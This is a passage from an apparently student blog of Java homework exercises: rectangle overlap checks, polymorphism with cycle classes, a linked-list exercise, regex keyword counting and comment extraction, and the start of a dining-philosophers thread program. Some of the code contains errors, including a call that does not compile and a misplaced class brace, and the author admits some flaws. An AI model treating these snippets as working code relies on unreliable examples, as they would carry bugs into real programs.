initialize:\"+this.width+'\\n'+\"height initialize:\"+this.height+'\\n');</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/*public void getArea(double width,double height)</span></span><br><span class=\"line\"><span class=\"comment\">    &#123;</span></span><br><span class=\"line\"><span class=\"comment\">        System.out.println(\"The area is:\"+width*height+'\\n');</span></span><br><span class=\"line\"><span class=\"comment\">    &#125;</span></span><br><span class=\"line\"><span class=\"comment\">    public void getPerimeter(double width,double height)</span></span><br><span class=\"line\"><span class=\"comment\">    &#123;</span></span><br><span class=\"line\"><span class=\"comment\">        System.out.println(\"The perimeter is:\"+2*(width+height));</span></span><br><span class=\"line\"><span class=\"comment\">    &#125;*/</span></span><br><span class=\"line\">    Point lower_left=<span class=\"keyword\">new</span> Point();</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">set</span><span class=\"params\">(<span class=\"keyword\">double</span> x,<span class=\"keyword\">double</span> y,<span class=\"keyword\">double</span> width,<span class=\"keyword\">double</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.width=width;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.height=height;</span><br><span class=\"line\">        lower_left.x=x;</span><br><span class=\"line\">        lower_left.y=y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">bPointIn</span><span class=\"params\">(Point p)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>((lower_left.x&lt;=p.x)&amp;&amp;(p.x&lt;=lower_left.x+<span class=\"keyword\">this</span>.width)&amp;&amp;(lower_left.y&lt;=p.y)&amp;&amp;(p.y&lt;=lower_left.y+<span class=\"keyword\">this</span>.height))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">bRectangleIn</span><span class=\"params\">(Rectangle r)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Point m=<span class=\"keyword\">new</span> Point();</span><br><span class=\"line\">        m.Initialize(r.x,r.y);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(bPointIn(m))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        m.Initialize(r.x+r.width,r.y);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(bPointIn(m))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        m.Initialize(r.x,r.y+r.height);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(bPointIn(m))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        m.Initialize(r.x+r.width,r.y+r.height);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(bPointIn(m))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Point</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> x,y;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Initialize</span><span class=\"params\">(<span class=\"keyword\">double</span> x,<span class=\"keyword\">double</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.x=x;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.y=y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">distance</span><span class=\"params\">(<span class=\"keyword\">double</span> a,<span class=\"keyword\">double</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//System.out.println(\"The distance is:\"+Math.sqrt((a-x)*(a-x)+(b-y)*(b-y)));</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Rectangle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> x,y,width,height;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Initialize</span><span class=\"params\">(<span class=\"keyword\">double</span> x,<span class=\"keyword\">double</span> y,<span class=\"keyword\">double</span> width,<span class=\"keyword\">double</span> height)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.x=x;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.y=y;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.width=width;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.height=height;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3-3中复杂在判断两个矩形是否有相互覆盖的地方，想出来的办法是对其中一个矩形的4个顶点分别调用判断是否在另一个矩形内的函数</p>\n<h2 id=\"3-9\"><a href=\"#3-9\" class=\"headerlink\" title=\"3-9\"></a>3-9</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work9</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Cycle a=<span class=\"keyword\">new</span> Cycle();</span><br><span class=\"line\">        Unicycle b=<span class=\"keyword\">new</span> Unicycle();</span><br><span class=\"line\">        Bicycle c=<span class=\"keyword\">new</span> Bicycle();</span><br><span class=\"line\">        Tricycle d=<span class=\"keyword\">new</span> Tricycle();</span><br><span class=\"line\">        run1(d);                 <span class=\"comment\">//upcasting</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Cycle e1=<span class=\"keyword\">new</span> Bicycle();</span><br><span class=\"line\">        Bicycle e2=(Bicycle) e1;</span><br><span class=\"line\">        run2(e2);                <span class=\"comment\">//downcasting</span></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">        if(e1 instanceof a)</span></span><br><span class=\"line\"><span class=\"comment\">        &#123;</span></span><br><span class=\"line\"><span class=\"comment\">            Bicycle e2=(Bicycle) e1;</span></span><br><span class=\"line\"><span class=\"comment\">            run2(e2);</span></span><br><span class=\"line\"><span class=\"comment\">        &#125;</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">run1</span><span class=\"params\">(Cycle cycle)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        cycle.wheel();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">run2</span><span class=\"params\">(Bicycle bicycle)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        bicycle.balance();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cycle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">ride</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">            wheel();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">wheel</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"4\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Unicycle</span> <span class=\"keyword\">extends</span> <span class=\"title\">Cycle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">wheel</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        balance();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">balance</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"1\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Bicycle</span> <span class=\"keyword\">extends</span> <span class=\"title\">Cycle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">wheel</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        balance();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">balance</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"2\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tricycle</span> <span class=\"keyword\">extends</span> <span class=\"title\">Cycle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">wheel</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"3\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3-9中对于向上转型和向下转型的理解还不是很到位，因为变得程序不多，现在还没体会到这种多态的巨大优势性</p>\n<h2 id=\"5-4\"><a href=\"#5-4\" class=\"headerlink\" title=\"5-4\"></a>5-4</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work5_4</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Deal</span><span class=\"params\">(String str1)</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> i,j=<span class=\"number\">0</span>;</span><br><span class=\"line\">            List&lt;Character&gt; a=<span class=\"keyword\">new</span> LinkedList&lt;Character&gt;();</span><br><span class=\"line\">            <span class=\"keyword\">char</span>[] str=str1.toCharArray();</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;str.length;i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(str[i]==<span class=\"string\">'+'</span>)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        a.add(j,str[i+<span class=\"number\">1</span>]);</span><br><span class=\"line\">                        j++;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(str[i]==<span class=\"string\">'-'</span>)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    System.out.print(a.get(j-<span class=\"number\">1</span>)+<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">                    a.remove(j-<span class=\"number\">1</span>);</span><br><span class=\"line\">                    j--;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"\\n\"</span>+a);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        String str=<span class=\"string\">\"+U+n+c---+e+r+t---+a-+i-+n+t+y---+-+r+u--+1+e+s---\"</span>;</span><br><span class=\"line\">        Deal(str);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-7\"><a href=\"#5-7\" class=\"headerlink\" title=\"5-7\"></a>5-7</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work5_7</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        String filepath=<span class=\"string\">\"D:\\\\wordlist.txt\"</span>;</span><br><span class=\"line\">        Deal(filepath);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Deal</span><span class=\"params\">(String filepath)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        String line;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> public1=<span class=\"number\">0</span>,class1=<span class=\"number\">0</span>,new1=<span class=\"number\">0</span>,import1=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            BufferedReader in=<span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> FileReader(filepath));</span><br><span class=\"line\">            line = in.readLine();</span><br><span class=\"line\">            Matcher m;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(line!=<span class=\"keyword\">null</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                String lines=line.toArray.split(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">                System.out.println(lines);</span><br><span class=\"line\">                m=Pattern.compile(<span class=\"string\">\"public\"</span>).matcher(line);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(m.find())</span><br><span class=\"line\">                    public1+=<span class=\"number\">1</span>;</span><br><span class=\"line\">                m=Pattern.compile(<span class=\"string\">\"class\"</span>).matcher(line);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(m.find())</span><br><span class=\"line\">                    class1+=<span class=\"number\">1</span>;</span><br><span class=\"line\">                m=Pattern.compile(<span class=\"string\">\"new\"</span>).matcher(line);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(m.find())</span><br><span class=\"line\">                    new1+=<span class=\"number\">1</span>;</span><br><span class=\"line\">                m=Pattern.compile(<span class=\"string\">\"import\"</span>).matcher(line);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(m.find())</span><br><span class=\"line\">                    import1+=<span class=\"number\">1</span>;</span><br><span class=\"line\">                line = in.readLine();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            in.close();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"public:\"</span>+public1);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"class:\"</span>+class1);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"new:\"</span>+new1);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"import:\"</span>+import1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">catch</span>(IOException e)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"Problemreading\"</span>+filepath);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//程序运行缺点：当一行有多个同样的关键字时，只能算作一个...</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"6-4\"><a href=\"#6-4\" class=\"headerlink\" title=\"6-4\"></a>6-4</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work6_4</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Deal deal=<span class=\"keyword\">new</span> Deal();</span><br><span class=\"line\">        deal.Work();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Deal</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> String str=<span class=\"string\">\"In this world there are millions of source and you can Learn from Every Possible Source. With a Master you start Learning to learn.\"</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Work</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"The string is\\n\"</span>+<span class=\"keyword\">this</span>.str);</span><br><span class=\"line\">        Matcher m1=Pattern.compile(<span class=\"string\">\"[aeiou]\"</span>).matcher(<span class=\"keyword\">this</span>.str);</span><br><span class=\"line\">        Matcher m2=Pattern.compile(<span class=\"string\">\"(?i)[aeiou]\"</span>).matcher(<span class=\"keyword\">this</span>.str);</span><br><span class=\"line\">        String str21=m1.replaceAll(<span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">        String str22=m2.replaceAll(<span class=\"string\">\"*\"</span>);</span><br><span class=\"line\">        System.out.println(str21);</span><br><span class=\"line\">        System.out.println(str22);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"6-6\"><a href=\"#6-6\" class=\"headerlink\" title=\"6-6\"></a>6-6</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Work6_6</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Read</span><span class=\"params\">(String filepath)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        String line;</span><br><span class=\"line\">        <span class=\"keyword\">try</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            BufferedReader in=<span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> FileReader(filepath));</span><br><span class=\"line\">            line=in.readLine();</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(line!=<span class=\"keyword\">null</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Matcher m=Pattern.compile(<span class=\"string\">\"//\\\\w+\"</span>).matcher(line);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(m.find())</span><br><span class=\"line\">                    System.out.println(m.group());</span><br><span class=\"line\">                <span class=\"comment\">/*m=Pattern.compile(\"/\\\\*\\\\w+\").matcher(line);</span></span><br><span class=\"line\"><span class=\"comment\">                if(m.find())</span></span><br><span class=\"line\"><span class=\"comment\">                    System.out.println(m.group());</span></span><br><span class=\"line\"><span class=\"comment\">                Matcher n=Pattern.compile(\"\\\\w+\\\\*\\\\/\").matcher(line);</span></span><br><span class=\"line\"><span class=\"comment\">                line=n.group();</span></span><br><span class=\"line\"><span class=\"comment\">                while(!n.find())</span></span><br><span class=\"line\"><span class=\"comment\">                &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                    System.out.println(line);</span></span><br><span class=\"line\"><span class=\"comment\">                    line = in.readLine();</span></span><br><span class=\"line\"><span class=\"comment\">                    n=Pattern.compile(\"\\\\w+\\\\*\\\\/\").matcher(line);</span></span><br><span class=\"line\"><span class=\"comment\">                &#125;*/</span></span><br><span class=\"line\">                <span class=\"comment\">//处理\"//\"可以，但是\"/* */\"处理不好 =。=</span></span><br><span class=\"line\">                line = in.readLine();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            in.close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">catch</span>(IOException e)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"Problemreading\"</span>+filepath);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        String filepath=<span class=\"string\">\"D:\\\\wordlist.txt\"</span>;</span><br><span class=\"line\">        Read(filepath);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"10-5\"><a href=\"#10-5\" class=\"headerlink\" title=\"10-5\"></a>10-5</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Lock</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">boolean</span> locked;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Lock</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        locked = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (locked)</span><br><span class=\"line\">            wait();</span><br><span class=\"line\">        locked = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">unlock</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        locked = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        notify();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Fork</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">char</span> id;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Lock lock = <span class=\"keyword\">new</span> Lock();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">pickup</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">putdown</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        lock.unlock();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Fork</span><span class=\"params\">(<span class=\"keyword\">int</span> j)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Integer i = <span class=\"keyword\">new</span> Integer(j);</span><br><span class=\"line\">        id = i.toString().charAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Philosopher</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">char</span> state = <span class=\"string\">'T'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Fork L, R;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Philosopher</span><span class=\"params\">(Fork left, Fork right)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>();</span><br><span class=\"line\">        L = left;</span><br><span class=\"line\">        R = right;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">think</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        sleep((<span class=\"keyword\">long</span>) (Math.random() * <span class=\"number\">100.0</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">eat</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        sleep((<span class=\"keyword\">long</span>) (Math.random() * <span class=\"number\">100.0</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">100</span>; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                state = <span class=\"string\">'T'</span>;<span class=\"comment\">//Thinking</span></span><br><span class=\"line\">                